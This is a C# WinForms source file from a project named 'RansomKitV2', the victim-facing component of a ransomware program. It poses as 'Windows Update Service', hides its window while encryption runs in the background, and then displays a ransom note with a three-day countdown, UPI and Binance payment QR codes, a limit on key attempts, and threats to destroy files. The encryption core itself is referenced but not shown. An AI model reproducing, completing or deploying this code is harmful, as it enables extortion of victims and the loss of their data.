using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomKitV2
{
    public class MainForm : Form
    {
        private readonly LaunchMode _mode;

        private Panel _payPanel = null!;
        private Label _lblCountdown = null!;
        private TextBox _keyBox = null!;
        private Button _unlockButton = null!;
        private Label _statusLabel = null!;

        private bool _destroying;
        private const string CryptoAddress = "";
        private const int DefaultWindowSeconds = 259200; // 3 Days

        public MainForm(LaunchMode mode = LaunchMode.Normal)
        {
            _mode = mode;
            Text = "Windows Update Service";
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.Sizable;
            MaximizeBox = true;
            MinimizeBox = true;
            MinimumSize = new Size(560, 400);
            BackColor = Color.FromArgb(20, 20, 24);
            AutoScaleMode = AutoScaleMode.Font;

            BuildPayPanel();
            Controls.Add(_payPanel);

            RansomCore.TimerTick += OnTimerTick;
            RansomCore.TimerExpired += OnTimerExpired;

            Load += OnLoad;
        }

        private void OnLoad(object? sender, EventArgs e)
        {
            bool locked = Persistence.IsLocked();
            var state = StateManager.Load();

            if (_mode == LaunchMode.Silent || _mode == LaunchMode.Decrypt || locked)
            {
                if (state != null && state.Attempts >= 5)
                {
                    MessageBox.Show("Maximum attempts reached. Files have been destroyed.", "System Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Environment.Exit(0);
                }

                if (state != null && !state.EncryptionCompleted)
                {
                    // RESUME INTERRUPTED ENCRYPTION (Hidden)
                    this.Visible = false;
                    this.ShowInTaskbar = false;

                    Task.Run(async () =>
                    {
                        await RansomCore.StartAutoAsync(TimeSpan.FromSeconds(DefaultWindowSeconds));

                        this.Invoke((Action)(() =>
                        {
                            this.Visible = true;
                            this.ShowInTaskbar = true;
                            _payPanel.Visible = true;
                            TopMost = true;
                            Activate();
                            BringToFront();
                        }));
                    });
                }
                else
                {
                    // NORMAL LOCK SCREEN (Encryption already complete)
                    this.Visible = true;
                    this.ShowInTaskbar = true;
                    _payPanel.Visible = true;
                    TopMost = true;
                    Activate();
                    RansomCore.ResumeTimer();
                }
            }
            else
            {
                // FRESH START (Encrypt silently in background)
                this.Visible = false;
                this.ShowInTaskbar = false;
                _payPanel.Visible = false;

                Task.Run(async () =>
                {
                    await RansomCore.StartAutoAsync(TimeSpan.FromSeconds(DefaultWindowSeconds));

                    this.Invoke((Action)(() =>
                    {
                        this.Visible = true;
                        this.ShowInTaskbar = true;
                        _payPanel.Visible = true;
                        TopMost = true;
                        Activate();
                        BringToFront();
                    }));
                });
            }
        }

        // =========================================================
        //  EVENT HANDLERS
        // =========================================================
        private void OnTimerTick(TimeSpan remaining)
        {
            if (_lblCountdown.IsDisposed) return;

            string timeText = remaining.Days > 0
                ? $"{remaining.Days}d {remaining.Hours:00}:{remaining.Minutes:00}:{remaining.Seconds:00}"
                : $"{remaining.Hours:00}:{remaining.Minutes:00}:{remaining.Seconds:00}";

            _lblCountdown.BeginInvoke((Action)(() =>
            {
                _lblCountdown.Text = $"TIME REMAINING: {timeText}";
                _lblCountdown.ForeColor = remaining.TotalMinutes <= 1 ? Color.Red : Color.WhiteSmoke;
            }));
        }

        private void OnTimerExpired()
        {
            if (_destroying) return;
            _destroying = true;

            if (_lblCountdown.IsDisposed) return;
            _lblCountdown.BeginInvoke((Action)(() =>
            {
                _lblCountdown.Text = "TIME EXPIRED";
                _lblCountdown.ForeColor = Color.Red;
                _keyBox.Enabled = false;
                _unlockButton.Enabled = false;
                _statusLabel.ForeColor = Color.FromArgb(220, 40, 40);
                _statusLabel.Text = "DESTROYING FILES...";
            }));

            MessageBox.Show(
                "The payment window has expired. All targeted files have been permanently destroyed.",
                "Windows Update",
                MessageBoxButtons.OK,
                MessageBoxIcon.Error);

            Environment.Exit(0);
        }

        // =========================================================
        //  PAY / UNLOCK PANEL
        // =========================================================
        private void BuildPayPanel()
        {
            var bg = Color.FromArgb(20, 20, 24);
            var cardBg = Color.FromArgb(26, 26, 30);
            var accent = Color.FromArgb(220, 40, 40);
            var textMain = Color.FromArgb(230, 230, 235);
            var textDim = Color.FromArgb(140, 140, 155);

            _payPanel = new Panel { Dock = DockStyle.Fill, BackColor = bg, Visible = false, AutoScroll = true };
            var container = new Panel { Dock = DockStyle.Top, AutoSize = true, BackColor = bg, Padding = new Padding(24, 16, 24, 16) };
            var layout = new TableLayoutPanel { Dock = DockStyle.Top, AutoSize = true, AutoSizeMode = AutoSizeMode.GrowAndShrink, ColumnCount = 1, BackColor = bg };
            layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));

            int row = 0;

            var title = new Label { Text = "YOUR FILES HAVE BEEN ENCRYPTED", ForeColor = accent, Font = new Font("Segoe UI", 15f, FontStyle.Bold), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter, Margin = new Padding(0, 0, 0, 12) };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 44f));
            layout.Controls.Add(title, 0, row++);

            _lblCountdown = new Label { Text = $"TIME REMAINING: ...", ForeColor = Color.WhiteSmoke, BackColor = Color.Transparent, Font = new Font("Consolas", 18f, FontStyle.Bold), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter, Margin = new Padding(0, 0, 0, 8) };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 56f));
            layout.Controls.Add(_lblCountdown, 0, row++);

            var noteCard = new Panel { Dock = DockStyle.Fill, BackColor = cardBg, BorderStyle = BorderStyle.FixedSingle, Padding = new Padding(16, 12, 16, 12), Margin = new Padding(0, 0, 0, 16) };
            var accentBar = new Panel { Dock = DockStyle.Left, Width = 4, BackColor = accent };
            var noteText = new Label { Dock = DockStyle.Fill, ForeColor = textMain, Font = new Font("Segoe UI", 9.5f), TextAlign = ContentAlignment.TopLeft, Text = "Your important documents, photos, and files have been encrypted with a secure AES-256 algorithm. The original files have been deleted.\r\n\r\nTo restore your data, you must obtain the unique decryption key. Complete the payment to one of the addresses below to receive it.\r\n\r\nIMPORTANT: If the countdown reaches zero, all targeted files will be permanently destroyed. Do not rename, move, or modify the .locked files." };
            noteCard.Controls.Add(noteText);
            noteCard.Controls.Add(accentBar);
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 150f));
            layout.Controls.Add(noteCard, 0, row++);

            var cryptoHeader = new Panel { Dock = DockStyle.Fill, Margin = new Padding(0, 0, 0, 4) };
            var cryptoTitle = new Label { Text = "UPI QR", ForeColor = textDim, Font = new Font("Segoe UI", 8.5f, FontStyle.Bold), Dock = DockStyle.Top, Height = 16 };
            var cryptoAddrBox = new TextBox { Text = CryptoAddress, ForeColor = textMain, BackColor = bg, Font = new Font("Consolas", 10f), BorderStyle = BorderStyle.None, ReadOnly = true, Dock = DockStyle.Top, Width = 400 };
            cryptoHeader.Controls.Add(cryptoAddrBox);
            cryptoHeader.Controls.Add(cryptoTitle);
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 36f));
            layout.Controls.Add(cryptoHeader, 0, row++);

            Image? cryptoImage = ScannerAsset.LoadAsset("scanner");
            var cryptoScannerBox = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.Zoom, BackColor = Color.FromArgb(14, 14, 18), BorderStyle = BorderStyle.FixedSingle, Padding = new Padding(4), Margin = new Padding(0, 0, 0, 16) };
            cryptoScannerBox.Image = cryptoImage ?? BuildPlaceholder();
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 200f));
            layout.Controls.Add(cryptoScannerBox, 0, row++);

            var (binanceImage, binanceFailed) = TryLoadBinanceScanner();
            bool hasBinance = binanceImage != null || binanceFailed;

            if (hasBinance)
            {
                var binanceHeader = new Label { Text = binanceFailed ? "BINANCE (IMAGE FAILED TO LOAD)" : "BINANCE QR", ForeColor = binanceFailed ? Color.FromArgb(220, 80, 80) : textDim, Font = new Font("Segoe UI", 8.5f, FontStyle.Bold), Dock = DockStyle.Fill, TextAlign = ContentAlignment.BottomLeft, Margin = new Padding(0, 0, 0, 4) };
                var binanceScannerBox = new PictureBox { Dock = DockStyle.Fill, SizeMode = PictureBoxSizeMode.Zoom, BackColor = Color.FromArgb(14, 14, 18), BorderStyle = BorderStyle.FixedSingle, Padding = new Padding(4), Margin = new Padding(0, 0, 0, 16) };
                if (binanceImage != null) binanceScannerBox.Image = binanceImage;
                else if (binanceFailed) binanceScannerBox.Image = BuildBinanceErrorPlaceholder();

                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 20f));
                layout.Controls.Add(binanceHeader, 0, row++);
                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 180f));
                layout.Controls.Add(binanceScannerBox, 0, row++);
            }

            var divider = new Panel { Dock = DockStyle.Fill, Height = 1, BackColor = Color.FromArgb(50, 50, 58), Margin = new Padding(0, 0, 0, 16) };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 1f));
            layout.Controls.Add(divider, 0, row++);

            var keyLabel = new Label { Text = "ENTER DECRYPTION KEY", ForeColor = textDim, Font = new Font("Segoe UI", 8.5f, FontStyle.Bold), Dock = DockStyle.Fill, TextAlign = ContentAlignment.BottomLeft, Margin = new Padding(0, 0, 0, 4) };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 20f));
            layout.Controls.Add(keyLabel, 0, row++);

            _keyBox = new TextBox { Dock = DockStyle.Fill, Font = new Font("Consolas", 11f), BackColor = Color.FromArgb(30, 30, 36), ForeColor = Color.White, BorderStyle = BorderStyle.FixedSingle, Margin = new Padding(0, 0, 0, 12) };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 32f));
            layout.Controls.Add(_keyBox, 0, row++);

            _unlockButton = new Button { Text = "UNLOCK FILES", Dock = DockStyle.Fill, FlatStyle = FlatStyle.Flat, BackColor = accent, ForeColor = Color.White, Font = new Font("Segoe UI", 11f, FontStyle.Bold), Margin = new Padding(0, 0, 0, 8) };
            _unlockButton.FlatAppearance.BorderSize = 0;
            _unlockButton.Click += UnlockButton_Click;
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 44f));
            layout.Controls.Add(_unlockButton, 0, row++);

            _statusLabel = new Label { Dock = DockStyle.Fill, ForeColor = textDim, Font = new Font("Segoe UI", 9f), TextAlign = ContentAlignment.MiddleCenter };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 24f));
            layout.Controls.Add(_statusLabel, 0, row++);

            container.Controls.Add(layout);
            _payPanel.Controls.Add(container);

            int targetHeight = layout.PreferredSize.Height + 32;
            int screenHeight = SystemInformation.WorkingArea.Height - 60;
            ClientSize = new Size(560, Math.Min(targetHeight, screenHeight));
        }

        private static (Image? image, bool fileFoundButFailed) TryLoadBinanceScanner()
        {
            var embedded = ScannerAsset.LoadEmbedded("binance");
            if (embedded != null) return (embedded, false);
            var disk = ScannerAsset.LoadFromDisk("binance");
            if (disk != null) return (disk, false);
            string baseDir = AppContext.BaseDirectory;
            foreach (var ext in new[] { "png", "jpg", "jpeg" })
            {
                if (File.Exists(Path.Combine(baseDir, "binance." + ext))) return (null, true);
            }
            return (null, false);
        }

        private static Bitmap BuildPlaceholder()
        {
            var bmp = new Bitmap(460, 200);
            using var g = Graphics.FromImage(bmp);
            using var pen = new Pen(Color.FromArgb(70, 70, 80));
            using var font = new Font("Segoe UI", 10f);
            using var brush = new SolidBrush(Color.DimGray);
            g.Clear(Color.FromArgb(14, 14, 18));
            g.DrawRectangle(pen, 0, 0, bmp.Width - 1, bmp.Height - 1);
            const string text = "scanner image missing — add scanner.png and rebuild";
            var size = g.MeasureString(text, font);
            g.DrawString(text, font, brush, (bmp.Width - size.Width) / 2f, (bmp.Height - size.Height) / 2f);
            return bmp;
        }

        private static Bitmap BuildBinanceErrorPlaceholder()
        {
            var bmp = new Bitmap(460, 180);
            using var g = Graphics.FromImage(bmp);
            using var pen = new Pen(Color.FromArgb(120, 40, 40));
            using var font = new Font("Segoe UI", 10f);
            using var brush = new SolidBrush(Color.FromArgb(220, 80, 80));
            g.Clear(Color.FromArgb(14, 14, 18));
            g.DrawRectangle(pen, 0, 0, bmp.Width - 1, bmp.Height - 1);
            const string text = "binance image found but could not be loaded\n(re-save as standard JPEG or PNG)";
            var size = g.MeasureString(text, font);
            g.DrawString(text, font, brush, (bmp.Width - size.Width) / 2f, (bmp.Height - size.Height) / 2f);
            return bmp;
        }

        private async void UnlockButton_Click(object? sender, EventArgs e)
        {
            string key = _keyBox.Text ?? string.Empty;

            _unlockButton.Enabled = false;
            _statusLabel.ForeColor = Color.FromArgb(150, 150, 165);
            _statusLabel.Text = "Verifying key...";

            try
            {
                await RansomCore.UnlockAsync(key);
                MessageBox.Show(this, "Files decrypted successfully.", "Windows Update", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Close();
            }
            catch (UnauthorizedAccessException ex)
            {
                _statusLabel.Text = ex.Message;
                _statusLabel.ForeColor = Color.FromArgb(220, 80, 80);
                _unlockButton.Enabled = true;
            }
            catch (Exception ex)
            {
                _statusLabel.Text = ex.Message;
                _statusLabel.ForeColor = Color.FromArgb(220, 80, 80);
                _unlockButton.Enabled = false;
            }
        }
    }
}